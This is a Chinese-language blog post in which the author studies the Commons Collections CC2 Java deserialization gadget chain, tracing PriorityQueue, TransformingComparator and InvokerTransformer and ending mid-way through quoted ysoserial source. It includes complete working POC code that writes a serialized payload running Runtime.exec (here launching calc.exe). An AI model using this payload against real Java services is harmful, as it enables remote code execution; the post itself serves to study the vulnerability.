<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CC链学习中 | Ho1L0w-By's Blog</title><meta name="keywords" content="Java安全,代码审计"><meta name="author" content="Ho1L0w-By"><meta name="copyright" content="Ho1L0w-By"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CC链学习中：前言：P神的Java安全漫谈中给出的学习路线是先学CC6，因为CC6提供了一个CC1在高版本下的解决条件，但是为了加强自己的分析能力，我还是准备按着顺序来走一遍。 这里的整体思路和调用链，将会主要参考网络上的文章还有ysoserial中的调用链。 CC2：调用链： Gadget chain: ObjectInputStream.readObject()    PriorityQueu">
<meta property="og:type" content="article">
<meta property="og:title" content="CC链学习中">
<meta property="og:url" content="https://ho1l0w-by.github.io/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/index.html">
<meta property="og:site_name" content="Ho1L0w-By&#39;s Blog">
<meta property="og:description" content="CC链学习中：前言：P神的Java安全漫谈中给出的学习路线是先学CC6，因为CC6提供了一个CC1在高版本下的解决条件，但是为了加强自己的分析能力，我还是准备按着顺序来走一遍。 这里的整体思路和调用链，将会主要参考网络上的文章还有ysoserial中的调用链。 CC2：调用链： Gadget chain: ObjectInputStream.readObject()    PriorityQueu">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ho1l0w-by.github.io/img/background.jpg">
<meta property="article:published_time" content="2023-09-21T10:15:10.000Z">
<meta property="article:modified_time" content="2023-09-21T10:19:39.718Z">
<meta property="article:author" content="Ho1L0w-By">
<meta property="article:tag" content="Java安全">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ho1l0w-by.github.io/img/background.jpg"><link rel="shortcut icon" href="/img/Myhead.jpg"><link rel="canonical" href="https://ho1l0w-by.github.io/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CC链学习中',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-09-21 18:19:39'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/Myhead.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%B9%A6%E8%AF%84"><i class="fa-fw fa fa-book"></i><span> 书评</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ho1L0w-By's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%B9%A6%E8%AF%84"><i class="fa-fw fa fa-book"></i><span> 书评</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CC链学习中</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-21T10:15:10.000Z" title="发表于 2023-09-21 18:15:10">2023-09-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-21T10:19:39.718Z" title="更新于 2023-09-21 18:19:39">2023-09-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CC链学习中"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CC链学习中："><a href="#CC链学习中：" class="headerlink" title="CC链学习中："></a>CC链学习中：</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>P神的Java安全漫谈中给出的学习路线是先学CC6，因为CC6提供了一个CC1在高版本下的解决条件，但是为了加强自己的分析能力，我还是准备按着顺序来走一遍。</p>
<p>这里的整体思路和调用链，将会主要参考网络上的文章还有ysoserial中的调用链。</p>
<h2 id="CC2："><a href="#CC2：" class="headerlink" title="CC2："></a>CC2：</h2><h3 id="调用链："><a href="#调用链：" class="headerlink" title="调用链："></a>调用链：</h3><blockquote>
<p>Gadget chain:<br> ObjectInputStream.readObject()<br>    PriorityQueue.readObject()<br>       …<br>          TransformingComparator.compare()<br>             InvokerTransformer.transform()<br>                Method.invoke()<br>                   Runtime.exec()</p>
</blockquote>
<p>可以看到这里多了几个类，首先了解一下这几个类：</p>
<h4 id="PriorityQueue-class"><a href="#PriorityQueue-class" class="headerlink" title="PriorityQueue.class:"></a>PriorityQueue.class:</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230507172311136.png" alt="image-20230507172311136"></p>
<h4 id="TransformingComparator-class"><a href="#TransformingComparator-class" class="headerlink" title="TransformingComparator.class:"></a>TransformingComparator.class:</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230507172855474.png" alt="image-20230507172855474"></p>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>这里不难看出来，整条链子的触发点在PriorityQueue类中。</p>
<h4 id="readObejct"><a href="#readObejct" class="headerlink" title="readObejct():"></a>readObejct():</h4><p>这里，我们首先进入<code>PriorityQueue#readObject</code>观察一下方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509223402766.png" alt="image-20230509223402766"></p>
<p>整个调用顺序是，首先调用了默认的读入，然后调用了readInt()，然后检查读入流数组长度是否超过预期。这部分都是普通的反序列化读入。</p>
<p>随后，从创建Object类的数组开始，其实就是实现了这个类最重要的特性，创建了一个基于堆的队列优先数组。</p>
<p>在for循环中，就是将反序列化数据流中的元素，一个一个存在<code>queue</code>这个数组中，然后开始调用函数<code>heapify()</code>来进行重新排列。</p>
<h4 id="heapify"><a href="#heapify" class="headerlink" title="heapify():"></a>heapify():</h4><p>这里跟进<code>heapify()</code>函数中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509225229839.png" alt="image-20230509225229839"></p>
<p>函数很干净，可以看到这里有一个for循环，然后调用了一个<code>siftDown()</code>函数，这个函数是什么呢。</p>
<h4 id="siftDown"><a href="#siftDown" class="headerlink" title="siftDown():"></a>siftDown():</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509225621646.png" alt="image-20230509225621646"></p>
<p>也就是说，这个函数其实就是实现了一个堆排序，也就等于说是整个heapify()函数的核心。</p>
<p>再次跟进一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509235208808.png" alt="image-20230509235208808"></p>
<p>两个函数：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509235240041.png" alt="image-20230509235240041"></p>
<p>这部分函数的效果是一个算法，具体可以自己理解一下，实际上就是将一个堆转换为一个最小堆。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509235402391.png" alt="image-20230509235402391"></p>
<p>这个方法实际上是差不多的，只是因为我们没有设置<code>comparator</code>，所以他强制性的转换了一个<code>key</code>对象，作为这个<code>comparator</code>对象，用于调用<code>compareTo()</code>方法。</p>
<p>因为我们之前在调用链中存在一个TransformingComparator.compare()，因此我们可以知道<code>comparator</code>是一个<code>TransformingComparator</code>类的对象，用于调用其compare()方法。</p>
<p>这里进入org.apache.commons.collections4.comparators;</p>
<p>可以找到compare()方法:</p>
<h4 id="compare-："><a href="#compare-：" class="headerlink" title="compare()："></a>compare()：</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230510001500217.png" alt="image-20230510001500217"></p>
<p>这里可以看到，调用了<code>this.transformer</code>的<code>transform()</code>方法。因为<code>this.transformer</code>这个变量是我们可以控制的，所以可以直接一波转进到我们之前学习过的CC1链子里。</p>
<p>到这里，就算是走通了调用链。</p>
<h3 id="初版POC"><a href="#初版POC" class="headerlink" title="初版POC:"></a>初版POC:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.offer(<span class="number">1</span>);</span><br><span class="line">        queue.offer(<span class="number">2</span>);<span class="comment">//调用offer()方法随便给队列中添加两个参数，调用add()也可以，add()最后也是调用的offer()方法。</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(filepath);</span><br><span class="line">            object.writeObject(queue);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里对queue中的队列添加了两个元素，这是因为PriorityQueue类其实就是一个排列方法，最后完成一个最大或者最小堆，就像我们之前分析siftDown()方法一样。</p>
<p>为了调用这个方法，会要求队列中至少有三个成员，也就是一个非叶子节点和它的左右子节点。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511214110850.png" alt="image-20230511214110850"></p>
<p>所以，我们需要让队列中有至少三个成员。</p>
<p>POC看上去好像挺美好的，但是有一个问题，当我运行这个POC的时候，会发现它直接调用了我的计算器，但是不会进行序列化。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511214302512.png" alt="image-20230511214302512"></p>
<p>这里步进调试，来看看是怎么回事：<br>我们可以发现，在我们添加第二个元素的时候，也就是<code>queue.offer(2)</code>的时候，会从offer()函数进入到siftUp()函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511215756672.png" alt="image-20230511215756672"></p>
<p>因为此时，我们已经设置了comparator的参数，所以这里会直接进入if分支，调用<code>siftUpUsingComparable()</code>方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511232123570.png" alt="image-20230511232123570"></p>
<p>当我们开始调用该函数的时候，会进入if()，然后开始调用<code>comparator.compare()</code>方法，这里也就是开始调用<code>TransformingComparator#compare()</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511232303413.png" alt="image-20230511232303413"></p>
<p>前面会调用两次ChainedTransformer类，也就会触发两次我们设计好的计算器，随后会直接return，直接结束了。因此不会执行后续的代码。</p>
<p>可以看到整体是没什么问题的，只要能改掉这里就行了。</p>
<h3 id="修改后POC"><a href="#修改后POC" class="headerlink" title="修改后POC:"></a>修改后POC:</h3><p>为了达成上述操作，我们就不能进入<code>siftUpUsingComparator()</code>方法，也就是不能在创建对象的时候，传入<code>comparator</code>参数。</p>
<p>这时，当我们向队列中添加元素的时候，就不会触发，而是触发<code>siftUpComparator()</code>方法替代。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511233121447.png" alt="image-20230511233121447"></p>
<p>可以看到的是，这里是将x，强制转换为了一个Comparable类，然后在if中调用了它的<code>compareTo()</code>方法，整个函数过程其实就是进行一个赋值，不会直接结束。</p>
<p>但是赋值完之后，要怎么才能给里面的元素添加我们封装好的<code>TransformingComparator</code>类呢？</p>
<p>这里最简单的方式就是通过反射，将我们封装好的类添加进去。</p>
<p>在POC中添加以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(queue,comparator);</span><br></pre></td></tr></table></figure>

<p>因为设置了comparator参数，所以等到时候readObject()的时候，就会按照我们想要的调用链开始。</p>
<p>随后调整一下顺序，我们就得到了完整的POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//反射获取成员变量的field</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//获取访问权限</span></span><br><span class="line">        field.set(queue,comparator);<span class="comment">//设置参数</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(filepath);</span><br><span class="line">            object.writeObject(queue);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">filepath2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(filepath2);</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException error)&#123;</span><br><span class="line">            error.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用效果:</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230512005246067.png" alt="image-20230512005246067"></p>
<h3 id="调用方式2："><a href="#调用方式2：" class="headerlink" title="调用方式2："></a>调用方式2：</h3><p>当然，在上面写的POC是调用的ChainedTransformer类中的链条，在ysoserial中给出的调用链是使用的</p>
<blockquote>
<p> TransformingComparator.compare()<br>           InvokerTransformer.transform()<br>              Method.invoke()<br>                 Runtime.exec()</p>
</blockquote>
<p>这里的调用思路就和我们之前简单使用<code>ChainedTransformer</code>不一样了，这里首先跟一下函数的调用。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230512164437598.png" alt="image-20230512164437598"></p>
<p>因为我们在调用transform()方法的时候，是传入了参数的，这里直接进else分支，然后调用method.invoke()，这里其实就是直接通过反射，来进行函数的调用。</p>
<p>但是这里反射的对象是input，也就是在调用Transform函数的时候传入的Object，这里回头看一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230513205010913.png" alt="image-20230513205010913"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230513205247504.png" alt="image-20230513205247504"></p>
<p>因此，我们在调用<code>InvokerTransformer#transform()</code>方法中反射的过程的时候，其实是调用的Object类中的<code>toString()</code>方法。</p>
<p>这个时候，我们就会发现，调用这个方法只会单纯的返回当前类的名字，没有什么调用方式，那么上述调用链是怎么实现的呢，让我们回头再重新阅读一下ysoserial的源码。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230513231355118.png" alt="image-20230513231355118"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">		<span class="comment">// mock method name until armed</span></span><br><span class="line">		<span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">		<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">		<span class="comment">// stub data for replacement later</span></span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line">		queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// switch method called by comparator</span></span><br><span class="line">		Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// switch contents of queue</span></span><br><span class="line">		<span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">		